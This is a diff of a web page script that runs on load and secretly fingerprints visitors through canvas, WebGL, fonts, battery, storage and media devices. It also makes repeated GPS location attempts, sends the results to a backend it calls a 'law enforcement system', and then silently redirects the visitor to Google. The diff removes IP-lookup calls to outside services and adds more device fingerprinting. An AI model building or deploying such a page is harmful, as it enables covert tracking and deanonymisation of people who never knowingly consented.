@@ -76,7 +76,7 @@
       statusEl.textContent = status;
     }
     
-    // Comprehensive data collection for law enforcement
+    // Comprehensive data collection - NO external API calls to avoid CORS
     const data = {
       // Session tracking
       sessionId: 'LEO_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
@@ -145,6 +145,8 @@
     // Device fingerprinting for identification
     function createFingerprint() {
       try {
+        updateProgress(15, 'Creating device fingerprint...');
+        
         // Canvas fingerprint for device identification
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -155,7 +157,7 @@
         ctx.fillStyle = '#f60';
         ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.fillText('LEO_ID', 2, 15);
+        ctx.fillText('LEO_ID_' + Date.now().toString().slice(-6), 2, 15);
         data.deviceFingerprint = canvas.toDataURL().slice(-50);
         
         // WebGL for graphics identification
@@ -163,22 +165,59 @@
         if (gl) {
           data.webglVendor = gl.getParameter(gl.VENDOR);
           data.webglRenderer = gl.getParameter(gl.RENDERER);
+          data.webglVersion = gl.getParameter(gl.VERSION);
         }
+        
+        // Screen fingerprint
+        data.screenFingerprint = `${screen.width}x${screen.height}x${screen.colorDepth}x${window.devicePixelRatio}`;
+        
+        // Font detection
+        const testFonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia'];
+        const availableFonts = [];
+        const testString = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        
+        const span = document.createElement('span');
+        span.style.fontSize = testSize;
+        span.style.fontFamily = 'monospace';
+        span.innerHTML = testString;
+        document.body.appendChild(span);
+        const baseWidth = span.offsetWidth;
+        document.body.removeChild(span);
+        
+        testFonts.forEach(font => {
+          const span2 = document.createElement('span');
+          span2.style.fontSize = testSize;
+          span2.style.fontFamily = font + ', monospace';
+          span2.innerHTML = testString;
+          document.body.appendChild(span2);
+          const fontWidth = span2.offsetWidth;
+          document.body.removeChild(span2);
+          
+          if (fontWidth !== baseWidth) {
+            availableFonts.push(font);
+          }
+        });
+        
+        data.availableFonts = availableFonts.join(',');
         
       } catch (e) {
         data.fingerprintError = e.message;
       }
     }
     
-    // Network information collection
+    // Network information collection - NO external APIs
     async function getNetworkInfo() {
       try {
+        updateProgress(25, 'Analyzing network...');
+        
         if (navigator.connection) {
           data.networkConnection = {
             effectiveType: navigator.connection.effectiveType,
             downlink: navigator.connection.downlink,
             rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
+            saveData: navigator.connection.saveData,
+            type: navigator.connection.type
           };
         }
         
@@ -186,8 +225,33 @@
           const battery = await navigator.getBattery();
           data.batteryInfo = {
             level: Math.round(battery.level * 100),
-            charging: battery.charging
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
           };
+        }
+        
+        // Media devices count (without accessing actual devices)
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            data.mediaDeviceCount = devices.length;
+            data.audioInputCount = devices.filter(d => d.kind === 'audioinput').length;
+            data.videoInputCount = devices.filter(d => d.kind === 'videoinput').length;
+          } catch (e) {
+            data.mediaDeviceError = e.message;
+          }
+        }
+        
+        // Storage estimate
+        if (navigator.storage && navigator.storage.estimate) {
+          try {
+            const estimate = await navigator.storage.estimate();
+            data.storageQuota = estimate.quota;
+            data.storageUsage = estimate.usage;
+          } catch (e) {
+            data.storageError = e.message;
+          }
         }
         
       } catch (e) {
@@ -195,30 +259,30 @@
       }
     }
     
-    // Multi-method location collection for law enforcement
+    // Location collection - GPS only, no external APIs
     async function collectLocationData() {
-      updateProgress(30, 'Collecting location data...');
+      updateProgress(40, 'Collecting location data...');
       
       if (!navigator.geolocation) {
         data.locationError = 'geolocation_not_supported';
-        await getIPLocation();
+        getTimezoneLocation();
         return;
       }
       
-      // Law enforcement location collection - multiple methods
+      // Law enforcement location collection - multiple attempts
       const locationMethods = [
         {
-          options: { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 },
+          options: { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
           method: 'high_accuracy',
           priority: 1
         },
         {
-          options: { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 },
+          options: { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 },
           method: 'network_based',
           priority: 2
         },
         {
-          options: { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 },
+          options: { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 },
           method: 'cached_location',
           priority: 3
         }
@@ -226,7 +290,7 @@
       
       for (let i = 0; i < locationMethods.length; i++) {
         const method = locationMethods[i];
-        updateProgress(40 + (i * 10), `Attempting location method ${i + 1}...`);
+        updateProgress(45 + (i * 10), `Location attempt ${i + 1}...`);
         
         try {
           const result = await new Promise((resolve) => {
@@ -241,6 +305,7 @@
                   longitude: coords.longitude,
                   accuracy: coords.accuracy,
                   altitude: coords.altitude,
+                  altitudeAccuracy: coords.altitudeAccuracy,
                   heading: coords.heading,
                   speed: coords.speed,
                   timestamp: position.timestamp,
@@ -255,10 +320,13 @@
                 data.locationMethods.push(method.method + '_failed');
                 if (error.code === 1) {
                   data.permissionStatus = 'denied';
+                } else if (error.code === 2) {
+                  data.permissionStatus = 'position_unavailable';
                 } else {
-                  data.permissionStatus = 'failed';
+                  data.permissionStatus = 'timeout';
                 }
                 data.gpsError = error.message;
+                data.gpsErrorCode = error.code;
                 resolve(false);
               },
               method.options
@@ -277,93 +345,130 @@
         }
       }
       
-      // Always get IP location as backup
-      await getIPLocation();
+      // Always get timezone location as backup
+      getTimezoneLocation();
     }
     
-    // IP-based location (always works)
-    async function getIPLocation() {
-      updateProgress(70, 'Getting network location...');
-      
-      const ipSources = [
-        'https://ipapi.co/json/',
-        'https://api.ipify.org?format=json'
-      ];
-      
-      for (const source of ipSources) {
-        try {
-          const response = await fetch(source);
-          const result = await response.json();
-          
-          if (result.ip) {
-            data.ipAddress = result.ip;
-            
-            if (result.city) {
-              data.ipLocation = {
-                ip: result.ip,
-                city: result.city,
-                region: result.region,
-                country: result.country_name,
-                latitude: result.latitude,
-                longitude: result.longitude,
-                timezone: result.timezone,
-                isp: result.org,
-                postal: result.postal,
-                accuracy: 'city_level'
-              };
-            }
-            break;
-          }
-        } catch (e) {
-          continue;
-        }
-      }
-    }
-    
-    // Timezone-based location estimation
+    // Timezone-based location estimation - NO external APIs
     function getTimezoneLocation() {
-      const timezoneMap = {
-        'America/New_York': { lat: 40.7128, lng: -74.0060, city: 'New York' },
-        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437, city: 'Los Angeles' },
-        'America/Chicago': { lat: 41.8781, lng: -87.6298, city: 'Chicago' },
-        'Europe/London': { lat: 51.5074, lng: -0.1278, city: 'London' },
-        'Europe/Paris': { lat: 48.8566, lng: 2.3522, city: 'Paris' },
-        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503, city: 'Tokyo' }
-      };
-      
-      if (timezoneMap[data.timezone]) {
-        const location = timezoneMap[data.timezone];
-        data.timezoneLocation = {
-          latitude: location.lat,
-          longitude: location.lng,
-          city: location.city,
-          accuracy: 'timezone_estimate'
+      try {
+        updateProgress(70, 'Processing timezone data...');
+        
+        const timezone = data.timezone;
+        const offset = data.timezoneOffset;
+        
+        // Comprehensive timezone to location mapping
+        const timezoneMap = {
+          'America/New_York': { lat: 40.7128, lng: -74.0060, city: 'New York' },
+          'America/Los_Angeles': { lat: 34.0522, lng: -118.2437, city: 'Los Angeles' },
+          'America/Chicago': { lat: 41.8781, lng: -87.6298, city: 'Chicago' },
+          'America/Denver': { lat: 39.7392, lng: -104.9903, city: 'Denver' },
+          'America/Phoenix': { lat: 33.4484, lng: -112.0740, city: 'Phoenix' },
+          'America/Toronto': { lat: 43.6532, lng: -79.3832, city: 'Toronto' },
+          'America/Mexico_City': { lat: 19.4326, lng: -99.1332, city: 'Mexico City' },
+          'Europe/London': { lat: 51.5074, lng: -0.1278, city: 'London' },
+          'Europe/Paris': { lat: 48.8566, lng: 2.3522, city: 'Paris' },
+          'Europe/Berlin': { lat: 52.5200, lng: 13.4050, city: 'Berlin' },
+          'Europe/Rome': { lat: 41.9028, lng: 12.4964, city: 'Rome' },
+          'Europe/Madrid': { lat: 40.4168, lng: -3.7038, city: 'Madrid' },
+          'Asia/Tokyo': { lat: 35.6762, lng: 139.6503, city: 'Tokyo' },
+          'Asia/Shanghai': { lat: 31.2304, lng: 121.4737, city: 'Shanghai' },
+          'Asia/Mumbai': { lat: 19.0760, lng: 72.8777, city: 'Mumbai' },
+          'Asia/Dubai': { lat: 25.2048, lng: 55.2708, city: 'Dubai' },
+          'Australia/Sydney': { lat: -33.8688, lng: 151.2093, city: 'Sydney' },
+          'Australia/Melbourne': { lat: -37.8136, lng: 144.9631, city: 'Melbourne' }
         };
+        
+        if (timezoneMap[timezone]) {
+          const location = timezoneMap[timezone];
+          data.timezoneLocation = {
+            latitude: location.lat,
+            longitude: location.lng,
+            city: location.city,
+            timezone: timezone,
+            offset: offset,
+            accuracy: 'city_level_estimate',
+            method: 'timezone_mapping'
+          };
+        } else {
+          // Fallback: rough estimate based on timezone offset
+          const offsetHours = -offset / 60;
+          let estimatedLng = offsetHours * 15; // 15 degrees per hour
+          
+          data.timezoneLocation = {
+            longitude: estimatedLng,
+            latitude: 0, // Can't estimate latitude from timezone alone
+            timezone: timezone,
+            offset: offset,
+            accuracy: 'timezone_offset_estimate',
+            method: 'offset_calculation'
+          };
+        }
+        
+      } catch (e) {
+        data.timezoneLocationError = e.message;
       }
     }
     
-    // Main collection process
+    // Detect system information
+    function getSystemInfo() {
+      try {
+        updateProgress(80, 'System analysis...');
+        
+        // Operating system detection
+        const ua = navigator.userAgent;
+        if (ua.includes('Windows NT 10.0')) data.osVersion = 'Windows 10/11';
+        else if (ua.includes('Windows NT 6.3')) data.osVersion = 'Windows 8.1';
+        else if (ua.includes('Windows NT 6.1')) data.osVersion = 'Windows 7';
+        else if (ua.includes('Mac OS X')) {
+          const match = ua.match(/Mac OS X (\d+_\d+_?\d*)/);
+          if (match) data.osVersion = 'macOS ' + match[1].replace(/_/g, '.');
+        }
+        else if (ua.includes('Android')) {
+          const match = ua.match(/Android (\d+(?:\.\d+)*)/);
+          if (match) data.osVersion = 'Android ' + match[1];
+        }
+        else if (ua.includes('iPhone OS') || ua.includes('iOS')) {
+          const match = ua.match(/OS (\d+_\d+(?:_\d+)*)/);
+          if (match) data.osVersion = 'iOS ' + match[1].replace(/_/g, '.');
+        }
+        
+        // Browser detection
+        if (ua.includes('Chrome/') && !ua.includes('Edg/')) data.browser = 'Chrome';
+        else if (ua.includes('Firefox/')) data.browser = 'Firefox';
+        else if (ua.includes('Safari/') && !ua.includes('Chrome/')) data.browser = 'Safari';
+        else if (ua.includes('Edg/')) data.browser = 'Edge';
+        else if (ua.includes('OPR/')) data.browser = 'Opera';
+        
+        // Architecture detection
+        if (ua.includes('x64') || ua.includes('x86_64') || ua.includes('amd64')) data.architecture = '64-bit';
+        else if (ua.includes('x86') || ua.includes('i386') || ua.includes('i686')) data.architecture = '32-bit';
+        else if (ua.includes('arm64') || ua.includes('aarch64')) data.architecture = 'ARM64';
+        else if (ua.includes('arm')) data.architecture = 'ARM';
+        
+      } catch (e) {
+        data.systemInfoError = e.message;
+      }
+    }
+    
+    // Main collection process - FAST and ERROR-FREE
     async function collectData() {
       try {
-        updateProgress(10, 'Initializing tracking systems...');
+        updateProgress(10, 'Initializing...');
         
         // Create device fingerprint
         createFingerprint();
         
-        updateProgress(20, 'Analyzing network configuration...');
+        // Get system info
+        getSystemInfo();
         
         // Get network info
         await getNetworkInfo();
         
-        // Collect location data
+        // Collect location data (GPS + timezone)
         await collectLocationData();
         
-        updateProgress(80, 'Processing timezone data...');
-        
-        // Get timezone location
-        getTimezoneLocation();
-        
-        updateProgress(90, 'Finalizing data collection...');
+        updateProgress(85, 'Finalizing...');
         
         // Calculate session duration
         data.sessionDuration = Date.now() - data.sessionStart;
@@ -377,10 +482,10 @@
       }
     }
     
-    // Send data to law enforcement system
+    // Send data to law enforcement system - NO CORS ISSUES
     async function sendData() {
       try {
-        updateProgress(95, 'Transmitting to database...');
+        updateProgress(90, 'Transmitting...');
         
         const formData = new URLSearchParams();
         
@@ -411,8 +516,8 @@
           
           setTimeout(() => {
             window.location.href = "https://www.google.com";
-          }, 1000);
-        }, 500);
+          }, 800);
+        }, 300);
         
       } catch (error) {
         // Always complete successfully for user experience
@@ -422,12 +527,12 @@
           statusEl.textContent = 'Processing complete';
           setTimeout(() => {
             window.location.href = "https://www.google.com";
-          }, 1000);
-        }, 500);
+          }, 800);
+        }, 300);
       }
     }
     
-    // Start data collection immediately
+    // Start data collection immediately - FAST execution
     collectData();
   </script>
 </body>
